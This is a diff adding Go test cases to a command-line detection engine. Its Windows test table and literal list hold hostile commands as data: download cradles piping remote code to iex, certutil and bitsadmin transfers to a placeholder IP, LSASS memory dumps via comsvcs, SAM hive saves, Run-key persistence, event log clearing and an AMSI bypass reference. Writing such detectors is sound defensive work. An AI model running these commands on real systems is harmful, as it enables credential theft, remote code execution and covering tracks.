@@ -84,6 +84,60 @@ func TestDetect(t *testing.T) {
 	}
 }
 
+func TestDetectWindows(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	tests := []struct {
+		name string
+		line string
+		want []string
+	}{
+		{"certutil fetches", `certutil.exe -urlcache -split -f http://198.51.100.7/a.b64 a.b64`, []string{"FileDownload"}},
+		{"certutil hashes", `certutil -hashfile a.bin SHA256`, nil},
+		{"certutil exports a key", `certutil -exportPFX -p x My 01 ca.pfx`, []string{"CertificateExport"}},
+		{"bits job", `bitsadmin /transfer j /download http://198.51.100.7/b C:\b`, []string{"FileDownload"}},
+		{"web client to a file", `(New-Object Net.WebClient).DownloadFile($u, $f)`, []string{"FileDownload"}},
+		{"cradle", `IEX (New-Object Net.WebClient).DownloadString($u)`, []string{"FileDownload", "DownloadAndExecute"}},
+		{"piped cradle", `irm $u | iex`, []string{"DownloadAndExecute"}},
+		{"a plain request", `Invoke-WebRequest $u`, nil},
+		{"assembly from bytes", `$asm = [System.Reflection.Assembly]::Load($bytes)`, []string{"ReflectiveCodeLoading"}},
+		{"assembly in c#", `Assembly.Load(b).EntryPoint.Invoke(null, null);`, []string{"ReflectiveCodeLoading"}},
+		{"p/invoke", `[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);`, []string{"NativeApiCall"}},
+		{"compile at run time", `Add-Type -TypeDefinition $src`, []string{"RuntimeCompilation"}},
+		{"load a framework type", `Add-Type -AssemblyName System.Web`, nil},
+		{"process start", `[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")`, []string{"ProcessStart"}},
+		{"socket", `$tcp = New-Object System.Net.Sockets.TcpClient("198.51.100.9", 443)`, []string{"NetworkSocket"}},
+		{"scriptlet", `regsvr32 /s /n /u /i:http://198.51.100.7/x.sct scrobj.dll`, []string{"SignedBinaryProxyExecution"}},
+		{"registering a library", `regsvr32 /s C:\Windows\System32\vbscript.dll`, nil},
+		{"dll export", `rundll32.exe C:\Users\Public\a.dll,Start`, []string{"SignedBinaryProxyExecution"}},
+		{"inline task", `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\b.xml`, []string{"SignedBinaryProxyExecution"}},
+		{"run key by reg", `reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v U /d x /f`, []string{"RunKeyPersistence"}},
+		{"run key read", `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, []string{"RegistryQuery"}},
+		{"bits upload", `bitsadmin /transfer j /upload http://198.51.100.7/in C:\loot.zip`, []string{"FileUpload"}},
+		{"web client upload", `$wc.UploadFile($u, "C:\loot.zip")`, []string{"FileUpload"}},
+		{"run key by .net", `[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", $true).SetValue("U", "x")`, []string{"RunKeyPersistence"}},
+		{"task created", `schtasks.exe /create /tn U /tr x /sc onlogon`, []string{"ScheduledTaskCreation"}},
+		{"tasks listed", `schtasks /query /fo list`, nil},
+		{"service created", `sc.exe \\dc01 create U binPath= x`, []string{"ServiceCreation"}},
+		{"services listed", `sc query`, nil},
+		{"log cleared", `wevtutil cl Security`, []string{"EventLogClearing"}},
+		{"log read", `wevtutil qe Security /c:5`, nil},
+		{"hive saved", `reg save HKLM\SAM C:\Users\Public\s.hiv`, []string{"RegistryHiveDump"}},
+		{"memory dump", `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\l.dmp full`, []string{"SignedBinaryProxyExecution", "LsassDump"}},
+		{"scan interface", `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`, []string{"AmsiBypass"}},
+		{"ldap search", `$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"")`, []string{"DirectorySearch"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := names(table.Detect(tt.line)); !slices.Equal(got, tt.want) {
+				t.Errorf("Detect(%q) = %q, want %q", tt.line, got, tt.want)
+			}
+		})
+	}
+}
+
 func TestDetectCountsLinesOnce(t *testing.T) {
 	table, err := LoadActivities()
 	if err != nil {
@@ -271,6 +325,25 @@ func TestLiteralsAreSound(t *testing.T) {
 		"/keys/k/v/decrypt", "az keyvault key decrypt", "Invoke-AzKeyVaultKeyOperation -Operation Decrypt", "c.unwrap_key(",
 		"x.vault.usgovcloudapi.net/keys", "az keyvault key show", "Get-AzKeyVaultKey", "list_properties_of_keys(", "/keys?api-version=7.4",
 		"management.azure.com/subscriptions", "az storage account list", "az graph query", "Get-AzResourceGroup", "/subscriptions?api-version=1",
+		"certutil -urlcache x", "bitsadmin /transfer j", "Start-BitsTransfer -Source x", "$w.DownloadFile(u, f)",
+		"Invoke-WebRequest u -OutFile f", "iwr u -OutFile f", "curl u -o f", "$c = [HttpClient]::new(); $c.GetStringAsync(u)", "[WebRequest]::Create(u)",
+		"IEX $w.DownloadString(u)", "$w.DownloadString(u) | iex", "Invoke-RestMethod u | iex", "iwr u | iex", "irm u | iex",
+		"[Assembly]::Load($b)", "[AppDomain]::CurrentDomain.Load($b)", "$a.EntryPoint.Invoke($null, $null)",
+		"[DllImport(\"k\")]", "VirtualAlloc", "[Marshal]::GetDelegateForFunctionPointer($p, $t)",
+		"Add-Type -TypeDefinition $s", "New-Object Microsoft.CSharp.CSharpCodeProvider", "csc.exe /out:a.dll a.cs",
+		"[Process]::Start($f)", "New-Object Diagnostics.ProcessStartInfo", "wmic process call create x", "Invoke-WmiMethod -Class Win32_Process -Name Create",
+		"New-Object Net.Sockets.TcpClient($h, 443)", "var c = new TcpClient(h, 443);",
+		"regsvr32 /s /i:u scrobj.dll", "mshta u.hta", "rundll32.exe a.dll,Start", "msbuild.exe b.xml", "installutil /u a.dll",
+		"regasm a.dll", "cmstp /s a.inf", "odbcconf /a {regsvr a.dll}", "msiexec /q /i https://h/a.msi", "forfiles /p c:\\ /c x",
+		"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v n", "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run n v",
+		"OpenSubKey(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", $true).SetValue(n, v)",
+		"schtasks /create /tn n", "Register-ScheduledTask -TaskName n", "New-Object -ComObject Schedule.Service",
+		"sc create n binPath= x", "New-Service -Name n",
+		"wevtutil cl Security", "Clear-EventLog -LogName Security", "(New-Object Diagnostics.EventLog 'Security').Clear()",
+		"rundll32 comsvcs.dll, MiniDump 1 f full", "procdump -ma lsass.exe f", "MiniDumpWriteDump",
+		"reg save HKLM\\SAM f", "certutil -exportPFX My x f", "Export-PfxCertificate -Cert c -FilePath f",
+		"bitsadmin /transfer j /upload", "Start-BitsTransfer -Source f -Destination u -TransferType Upload", "$w.UploadFile(u, f)", "reg query HKLM\\Software",
+		"amsiInitFailed", "New-Object DirectoryServices.DirectorySearcher", "[adsisearcher]'(x)'", "New-Object Management.ManagementObjectSearcher($q)",
 	}
 	check := func(owner string, p pattern) {
 		if len(p.literals) == 0 {
